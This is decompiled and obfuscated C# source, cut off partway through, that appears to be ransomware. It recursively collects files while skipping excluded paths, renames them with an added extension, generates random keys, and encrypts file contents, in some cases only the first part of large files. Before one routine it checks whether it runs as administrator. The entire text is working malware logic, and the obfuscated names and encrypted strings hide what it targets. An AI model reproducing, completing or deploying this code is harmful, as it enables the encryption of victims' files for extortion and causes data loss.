using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using AAVUoeMXgFh;
using Microsoft.Win32;
using ODusMbbiJwu;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using zsCTTYWyHDaJcbz;

namespace KXfHkplBSblOeZ;

internal sealed class NiISdmMYRfnXGiX
{
	public sealed class WvuVfLQcGRdk
	{
		private static StringCollection NSsWdPeuuBwSYQ;

		private static List<string> zzbmOOZyMKht;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107406918));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107406881)) && !text.ToLower().Contains(getString_0(107406892)) && !text.ToLower().Contains(getString_0(107393420)) && !text.ToLower().Contains(getString_0(107392863)) && !text.ToLower().Contains(getString_0(107406847)) && !text.ToLower().Contains(getString_0(107392743)) && !text.ToLower().Contains(getString_0(107392684)) && !text.ToLower().Contains(getString_0(107392635)) && !text.ToLower().Contains(getString_0(107392650)) && !text.ToLower().Contains(getString_0(107393113)) && !text.ToLower().Contains(getString_0(107393079)) && !text.ToLower().Contains(getString_0(107393094)) && !text.ToLower().Contains(getString_0(107393045)) && !text.ToLower().Contains(getString_0(107393064)) && !text.ToLower().Contains(getString_0(107393011)) && !text.ToLower().Contains(getString_0(107393030)) && !text.ToLower().Contains(getString_0(107392985)) && !text.ToLower().Contains(getString_0(107393000)) && !text.ToLower().Contains(getString_0(107392951)) && !text.Contains(yasjygrGJqTJ(getString_0(107392966))) && !text.Contains(getString_0(107392941)) && !text.Contains(getString_0(107392911)) && !text.EndsWith(getString_0(107395326)) && !text.EndsWith(getString_0(107392342)) && !text.EndsWith(getString_0(107392369)) && !text.EndsWith(getString_0(107392364)) && !text.EndsWith(getString_0(107392359)) && !text.ToLower().Contains(getString_0(107392354)) && !text.ToLower().Contains(xDhcruhrTvVZb))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(peIBzCUyrIICrp) * 1024.0 * 1024.0 && SqCSaFJrwXuBuO == getString_0(107396886))
							{
								zzbmOOZyMKht.Add(text);
							}
							else if (File.Exists(text) && SqCSaFJrwXuBuO == getString_0(107396891))
							{
								zzbmOOZyMKht.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return zzbmOOZyMKht;
		}

		static WvuVfLQcGRdk()
		{
			Strings.CreateGetStringDelegate(typeof(WvuVfLQcGRdk));
			NSsWdPeuuBwSYQ = new StringCollection();
			zzbmOOZyMKht = new List<string>();
		}
	}

	private sealed class rfQRQwiJMNWh
	{
		public string nukJnuoWJwW;

		public bool _003CMain_003Eb__7(Process process_0)
		{
			return process_0.ProcessName == nukJnuoWJwW;
		}
	}

	private sealed class DMYYaczBvTmMS
	{
		public string[] UYOPscsWJOHBH;

		public void _003CMain_003Eb__8()
		{
			GsoClIYtJBCmx.xXsswAMuAoNvDiei(UYOPscsWJOHBH);
		}
	}

	private sealed class lfAHActFMqi
	{
		public string mrsBMKhLaUfu;

		public bool _003CIsDriveNTFS_003Eb__21(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == mrsBMKhLaUfu;
		}
	}

	private sealed class tAxVBKFRENS
	{
		private sealed class mDMSdzCjPkWpMP
		{
			public tAxVBKFRENS WAKkqyKSObcbB;

			public string xXlXgoquwPP;

			public void _003CCrypt_003Eb__27()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					ZEieWhItMXsBY(WindowsIdentity.GetCurrent().Name, xXlXgoquwPP);
				}
			}

			public void _003CCrypt_003Eb__28()
			{
				rjKQLtisbh(xXlXgoquwPP, WAKkqyKSObcbB.ZZgSVyiOZYPYtr, WAKkqyKSObcbB.lQMbYJppRrxbKzZ, WAKkqyKSObcbB.IGWEZVHTSEwDdW, WAKkqyKSObcbB.ESkqjLpKLM);
			}
		}

		public string[] ZZgSVyiOZYPYtr;

		public string[] IGWEZVHTSEwDdW;

		public string ESkqjLpKLM;

		public string lQMbYJppRrxbKzZ;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__26(string string_0)
		{
			mDMSdzCjPkWpMP CS_0024_003C_003E8__locals0 = new mDMSdzCjPkWpMP();
			CS_0024_003C_003E8__locals0.WAKkqyKSObcbB = this;
			CS_0024_003C_003E8__locals0.xXlXgoquwPP = string_0;
			if (YBZiXtOnyfJCXsA && !hpcvcOchTBoC().Contains(getString_0(107389509)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						ZEieWhItMXsBY(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.xXlXgoquwPP);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (GLHMCZIBTJO == getString_0(107396894))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					rjKQLtisbh(CS_0024_003C_003E8__locals0.xXlXgoquwPP, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.ZZgSVyiOZYPYtr, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.lQMbYJppRrxbKzZ, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.IGWEZVHTSEwDdW, CS_0024_003C_003E8__locals0.WAKkqyKSObcbB.ESkqjLpKLM);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				rjKQLtisbh(CS_0024_003C_003E8__locals0.xXlXgoquwPP, ZZgSVyiOZYPYtr, lQMbYJppRrxbKzZ, IGWEZVHTSEwDdW, ESkqjLpKLM);
			}
		}

		static tAxVBKFRENS()
		{
			Strings.CreateGetStringDelegate(typeof(tAxVBKFRENS));
		}
	}

	private sealed class onnLxZACFDoQRfFR
	{
		private sealed class YTuGDJdIYFsZ
		{
			public onnLxZACFDoQRfFR AoJYoKLZeLlp;

			public string WYnjyahANXiK;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__34()
			{
				foreach (string item in EDjNxpdqMiO)
				{
					if (WYnjyahANXiK.ToLower().EndsWith(item + AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == getString_0(107396905))
					{
						if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(WYnjyahANXiK).Length)
						{
							try
							{
								OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393287), getString_0(107393314), getString_0(107393301), WYnjyahANXiK);
							}
							catch
							{
							}
						}
					}
					else if (WYnjyahANXiK.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396910))
					{
						try
						{
							OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393287), getString_0(107393314), getString_0(107393301), WYnjyahANXiK);
						}
						catch
						{
						}
					}
				}
			}

			static YTuGDJdIYFsZ()
			{
				Strings.CreateGetStringDelegate(typeof(YTuGDJdIYFsZ));
			}
		}

		private sealed class mNXzBWmdFqVDm
		{
			public onnLxZACFDoQRfFR AoJYoKLZeLlp;

			public string hpBPJRIyXygh;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__36()
			{
				foreach (string item in EDjNxpdqMiO)
				{
					if (hpBPJRIyXygh.ToLower().EndsWith(item + AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == getString_0(107396908))
					{
						if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(hpBPJRIyXygh).Length)
						{
							try
							{
								OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393290), getString_0(107393317), getString_0(107393304), hpBPJRIyXygh);
							}
							catch
							{
							}
						}
					}
					else if (hpBPJRIyXygh.ToLower().EndsWith(item) && PZbbmsztNpThUc == getString_0(107396913))
					{
						try
						{
							OMlrSKpvSZZjN.xBtqCBaTuwIQXV(getString_0(107393290), getString_0(107393317), getString_0(107393304), hpBPJRIyXygh);
						}
						catch
						{
						}
					}
				}
			}

			static mNXzBWmdFqVDm()
			{
				Strings.CreateGetStringDelegate(typeof(mNXzBWmdFqVDm));
			}
		}

		public List<string> AvnPsxaqmDEjr;

		public List<string> vgijhoARFhV;

		public string aBgVqDzNPCJQ;

		public string[] NEFVMVTqVdkNle;

		public string NRMuHnCdQTWUX;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__33(string string_0)
		{
			YTuGDJdIYFsZ CS_0024_003C_003E8__locals0;
			foreach (string item in vgijhoARFhV)
			{
				if (item.Contains(getString_0(107393479)) || item.Contains(getString_0(107393454)) || item.Contains(getString_0(107393421)) || item.ToLower().Contains(getString_0(107393436)) || item.ToLower().Contains(getString_0(107392879)) || item.Contains(getString_0(107392886)) || item.Contains(getString_0(107392865)) || item.ToLower().Contains(getString_0(107392816)) || item.ToLower().Contains(getString_0(107392803)) || item.ToLower().Contains(getString_0(107392798)) || item.ToLower().Contains(getString_0(107392789)) || item.ToLower().Contains(getString_0(107392740)) || item.ToLower().Contains(getString_0(107392714)) || item.ToLower().Contains(getString_0(107392725)) || item.Contains(getString_0(107392700)) || item.Contains(getString_0(107392651)) || item.Contains(getString_0(107392666)) || item.Contains(getString_0(107393129)) || item.Contains(getString_0(107393144)) || item.Contains(getString_0(107393095)) || item.Contains(getString_0(107393110)) || item.Contains(getString_0(107393061)) || item.Contains(getString_0(107393080)) || item.Contains(getString_0(107393027)) || item.ToLower().Contains(getString_0(107393046)) || item.ToLower().Contains(getString_0(107393001)) || item.ToLower().Contains(getString_0(107393016)) || item.ToLower().Contains(getString_0(107392967)) || item.Contains(yasjygrGJqTJ(getString_0(107392982))) || item.Contains(getString_0(107392957)) || item.Contains(getString_0(107392912)) || item.Contains(getString_0(107392927)) || item.EndsWith(aBgVqDzNPCJQ) || item.EndsWith(getString_0(107392358)) || item.EndsWith(getString_0(107392385)) || item.EndsWith(getString_0(107392380)) || item.EndsWith(getString_0(107392375)) || item.Contains(getString_0(107392370)) || item.Contains(xDhcruhrTvVZb) || item.Contains(eBcYzZJOdxm) || item.Contains(xOMcrEjNtvCmv))
				{
					continue;
				}
				if (NEFVMVTqVdkNle.Length != 0)
				{
					string[] nEFVMVTqVdkNle = NEFVMVTqVdkNle;
					int num = 0;
					while (num < nEFVMVTqVdkNle.Length)
					{
						string value = nEFVMVTqVdkNle[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0bd3;
					}
				}
				try
				{
					if (item.EndsWith(aBgVqDzNPCJQ))
					{
						goto IL_0bd3;
					}
				}
				catch (Exception)
				{
					goto IL_0bd3;
				}
				if (!item.EndsWith(string_0) || LfbVDKLAiBGoZzsY.Contains(item))
				{
					continue;
				}
				if (nSEgZCqbKaXqV == getString_0(107396902))
				{
					try
					{
						if (YzwwFGKYRQ.ObGmZLtKCYVXPi(item))
						{
							YzwwFGKYRQ.zrrspuNzyYvqy(item);
						}
					}
					catch
					{
					}
				}
				LfbVDKLAiBGoZzsY.Add(item);
				if (!wGUqZKpPfawraYO.Contains(Path.GetDirectoryName(item)))
				{
					wGUqZKpPfawraYO.Add(Path.GetDirectoryName(item));
				}
				ecfiytuwBKtog(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (SsCiUkhFaPaV)
						{
							try
							{
								File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + item + getString_0(107406878) + ex2.Message + getString_0(107396695));
							}
							catch (Exception)
							{
							}
						}
						BFoWsrHVmkbzUDmB++;
						goto end_IL_0537;
					}
					if (TmUHufxiasI == getString_0(107396902) && new FileInfo(item).Length > Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024 && !AvnPsxaqmDEjr.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new YTuGDJdIYFsZ();
						CS_0024_003C_003E8__locals0.AoJYoKLZeLlp = this;
						try
						{
							if (aBgVqDzNPCJQ != getString_0(107389436))
							{
								if (bpZBDgMzOhYn)
								{
									aBgVqDzNPCJQ = qJZaPzetTV + aBgVqDzNPCJQ;
								}
								File.Move(item, item + aBgVqDzNPCJQ);
							}
						}
						catch (Exception ex4)
						{
							if (SsCiUkhFaPaV)
							{
								try
								{
									File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + item + getString_0(107406817) + ex4.Message + getString_0(107396695));
								}
								catch (Exception)
								{
								}
							}
							BFoWsrHVmkbzUDmB++;
							goto end_IL_0537;
						}
						CS_0024_003C_003E8__locals0.WYnjyahANXiK = getString_0(107393235);
						if (aBgVqDzNPCJQ != getString_0(107389436))
						{
							CS_0024_003C_003E8__locals0.WYnjyahANXiK = item + aBgVqDzNPCJQ;
						}
						else
						{
							CS_0024_003C_003E8__locals0.WYnjyahANXiK = item;
						}
						if (NovBIDwMVoo == getString_0(107396902))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in EDjNxpdqMiO)
								{
									if (CS_0024_003C_003E8__locals0.WYnjyahANXiK.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == YTuGDJdIYFsZ.getString_0(107396905))
									{
										if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.WYnjyahANXiK).Length)
										{
											try
											{
												OMlrSKpvSZZjN.xBtqCBaTuwIQXV(YTuGDJdIYFsZ.getString_0(107393287), YTuGDJdIYFsZ.getString_0(107393314), YTuGDJdIYFsZ.getString_0(107393301), CS_0024_003C_003E8__locals0.WYnjyahANXiK);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.WYnjyahANXiK.ToLower().EndsWith(item2) && PZbbmsztNpThUc == YTuGDJdIYFsZ.getString_0(107396910))
									{
										try
										{
											OMlrSKpvSZZjN.xBtqCBaTuwIQXV(YTuGDJdIYFsZ.getString_0(107393287), YTuGDJdIYFsZ.getString_0(107393314), YTuGDJdIYFsZ.getString_0(107393301), CS_0024_003C_003E8__locals0.WYnjyahANXiK);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = HxsVTRcRgpiH.RPPZNxOHyFu(32);
						string s = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (PvwxfopQfRocU == getString_0(107396907))
						{
							byte[] array = null;
							byte[] byte_ = ufQnCLzUSY.QCdhmxBPZB(CS_0024_003C_003E8__locals0.WYnjyahANXiK, Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024);
							ufQnCLzUSY.FavttmDwCR(YILmajIKZPh: (!uBTtlGfiltatoKc) ? (dHWQzBpmcn ? ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dHWQzBpmcn ? cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), zglVXSzColkNb: CS_0024_003C_003E8__locals0.WYnjyahANXiK, FsywuXEZiQBBeb: bytes);
						}
						else if (!dHWQzBpmcn)
						{
							OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.WYnjyahANXiK, CiXuUORQDucyebW, NRMuHnCdQTWUX);
						}
						else
						{
							OAyPyXfJFHzyE.pjoDpqAxNLvCK(CS_0024_003C_003E8__locals0.WYnjyahANXiK, CiXuUORQDucyebW, text, bytes);
						}
					}
					else
					{
						if (bpZBDgMzOhYn)
						{
							aBgVqDzNPCJQ = qJZaPzetTV + aBgVqDzNPCJQ;
						}
						string text2 = HxsVTRcRgpiH.RPPZNxOHyFu(32);
						string s2 = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (aBgVqDzNPCJQ != getString_0(107389436))
						{
							if (!bEJKBhTzHL)
							{
								if (!dHWQzBpmcn)
								{
									wjPMLlmajetI(item, item + aBgVqDzNPCJQ, WwvaLWuUsMuy);
								}
								else
								{
									wjPMLlmajetI(item, item + aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dHWQzBpmcn)
									{
										CQSgBNnEZGz(item, item + aBgVqDzNPCJQ, WwvaLWuUsMuy);
									}
									else
									{
										CQSgBNnEZGz(item, item + aBgVqDzNPCJQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (SsCiUkhFaPaV)
									{
										try
										{
											File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + item + getString_0(107389390) + ex6.Message + getString_0(107396695));
										}
										catch (Exception)
										{
										}
									}
									BFoWsrHVmkbzUDmB++;
									goto end_IL_0537;
								}
							}
						}
						else if (!bEJKBhTzHL)
						{
							if (!dHWQzBpmcn)
							{
								wjPMLlmajetI(item, item + getString_0(107389431), WwvaLWuUsMuy);
							}
							else
							{
								wjPMLlmajetI(item, item + getString_0(107389431), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!dHWQzBpmcn)
								{
									CQSgBNnEZGz(item, item, WwvaLWuUsMuy);
								}
								else
								{
									CQSgBNnEZGz(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (SsCiUkhFaPaV)
								{
									try
									{
										File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + item + getString_0(107389390) + ex8.Message + getString_0(107396695));
									}
									catch (Exception)
									{
									}
								}
								BFoWsrHVmkbzUDmB++;
								goto end_IL_0537;
							}
						}
						if (dHWQzBpmcn)
						{
							if (aBgVqDzNPCJQ != getString_0(107389436))
							{
								ulbKceXLNzC(item + aBgVqDzNPCJQ, bytes2);
							}
							else
							{
								ulbKceXLNzC(item, bytes2);
							}
						}
					}
					goto IL_0bd3;
					end_IL_0537:;
				}
				catch (Exception)
				{
					goto IL_0bd3;
				}
				continue;
				IL_0bd3:
				vgijhoARFhV.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__35(string string_0)
		{
			mNXzBWmdFqVDm CS_0024_003C_003E8__locals0 = new mNXzBWmdFqVDm();
			CS_0024_003C_003E8__locals0.AoJYoKLZeLlp = this;
			CS_0024_003C_003E8__locals0.hpBPJRIyXygh = string_0;
			if (!CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393479)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393454)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393421)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107393436)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392879)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392886)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392865)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392816)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392803)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392798)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392789)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392740)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392714)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392725)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392700)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392651)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392666)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393129)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393144)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393095)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393110)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393061)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393080)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107393027)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107393046)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107393001)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107393016)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().Contains(getString_0(107392967)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(yasjygrGJqTJ(getString_0(107392982))) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392957)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392912)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392927)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(aBgVqDzNPCJQ) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(getString_0(107392358)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(getString_0(107392385)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(getString_0(107392380)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(getString_0(107392375)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(getString_0(107392370)) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(xDhcruhrTvVZb) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(eBcYzZJOdxm) && !CS_0024_003C_003E8__locals0.hpBPJRIyXygh.Contains(xOMcrEjNtvCmv))
			{
				if (NEFVMVTqVdkNle.Length != 0)
				{
					string[] nEFVMVTqVdkNle = NEFVMVTqVdkNle;
					int num = 0;
					while (num < nEFVMVTqVdkNle.Length)
					{
						string value = nEFVMVTqVdkNle[num];
						if (!CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0d56;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.EndsWith(aBgVqDzNPCJQ))
					{
						goto IL_0d56;
					}
				}
				catch (Exception)
				{
					goto IL_0d56;
				}
				if (!LfbVDKLAiBGoZzsY.Contains(CS_0024_003C_003E8__locals0.hpBPJRIyXygh))
				{
					if (nSEgZCqbKaXqV == getString_0(107396902))
					{
						try
						{
							if (YzwwFGKYRQ.ObGmZLtKCYVXPi(CS_0024_003C_003E8__locals0.hpBPJRIyXygh))
							{
								YzwwFGKYRQ.zrrspuNzyYvqy(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
							}
						}
						catch
						{
						}
					}
					LfbVDKLAiBGoZzsY.Add(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
					if (!wGUqZKpPfawraYO.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hpBPJRIyXygh)))
					{
						wGUqZKpPfawraYO.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.hpBPJRIyXygh));
					}
					ecfiytuwBKtog(CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length != 0L)
							{
								goto end_IL_0656;
							}
							goto end_IL_0656_2;
							end_IL_0656:;
						}
						catch (Exception ex2)
						{
							if (SsCiUkhFaPaV)
							{
								try
								{
									File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107406878) + ex2.Message + getString_0(107396695));
								}
								catch (Exception)
								{
								}
							}
							BFoWsrHVmkbzUDmB++;
							goto end_IL_0656_2;
						}
						if (TmUHufxiasI == getString_0(107396902) && new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length > Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024)
						{
							try
							{
								if (aBgVqDzNPCJQ != getString_0(107389436))
								{
									if (bpZBDgMzOhYn)
									{
										aBgVqDzNPCJQ = qJZaPzetTV + aBgVqDzNPCJQ;
									}
									File.Move(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, CS_0024_003C_003E8__locals0.hpBPJRIyXygh + aBgVqDzNPCJQ);
								}
							}
							catch (Exception ex4)
							{
								if (SsCiUkhFaPaV)
								{
									try
									{
										File.AppendAllText(eBcYzZJOdxm, getString_0(107389171) + CS_0024_003C_003E8__locals0.hpBPJRIyXygh + getString_0(107406817) + ex4.Message + getString_0(107396695));
									}
									catch (Exception)
									{
									}
								}
								BFoWsrHVmkbzUDmB++;
								return;
							}
							if (aBgVqDzNPCJQ != getString_0(107389436))
							{
								CS_0024_003C_003E8__locals0.hpBPJRIyXygh += aBgVqDzNPCJQ;
							}
							if (NovBIDwMVoo == getString_0(107396902))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in EDjNxpdqMiO)
									{
										if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.AoJYoKLZeLlp.aBgVqDzNPCJQ) && PZbbmsztNpThUc == mNXzBWmdFqVDm.getString_0(107396908))
										{
											if (Convert.ToInt32(qPOqWisoNZy) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.hpBPJRIyXygh).Length)
											{
												try
												{
													OMlrSKpvSZZjN.xBtqCBaTuwIQXV(mNXzBWmdFqVDm.getString_0(107393290), mNXzBWmdFqVDm.getString_0(107393317), mNXzBWmdFqVDm.getString_0(107393304), CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.hpBPJRIyXygh.ToLower().EndsWith(item) && PZbbmsztNpThUc == mNXzBWmdFqVDm.getString_0(107396913))
										{
											try
											{
												OMlrSKpvSZZjN.xBtqCBaTuwIQXV(mNXzBWmdFqVDm.getString_0(107393290), mNXzBWmdFqVDm.getString_0(107393317), mNXzBWmdFqVDm.getString_0(107393304), CS_0024_003C_003E8__locals0.hpBPJRIyXygh);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = HxsVTRcRgpiH.RPPZNxOHyFu(32);
							string s = yeiIYsgqfPPobuZc.cWgNetVEfgEv(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (PvwxfopQfRocU == getString_0(107396907))
							{
								byte[] array = null;
								byte[] byte_ = ufQnCLzUSY.QCdhmxBPZB(CS_0024_003C_003E8__locals0.hpBPJRIyXygh, Convert.ToInt32(CiXuUORQDucyebW) * 1024 * 1024);
								ufQnCLzUSY.FavttmDwCR(YILmajIKZPh: (!uBTtlGfiltatoKc) ? (dHWQzBpmcn ? ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : ufQnCLzUSY.LLqeTUvZTvS(byte_, Encoding.ASCII.GetBytes(NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dHWQzBpmcn ? cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : cjmgOsWWHNKDnF.ZKVQwrhLTMzsBn(byte_, Encoding.ASCII.GetBytes(NRMuHnCdQTWUX), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), zglVXSzColkNb: CS_0024_003C_003E8__locals0.hpBPJRIyXygh, FsywuXEZiQBBeb: bytes);
							}
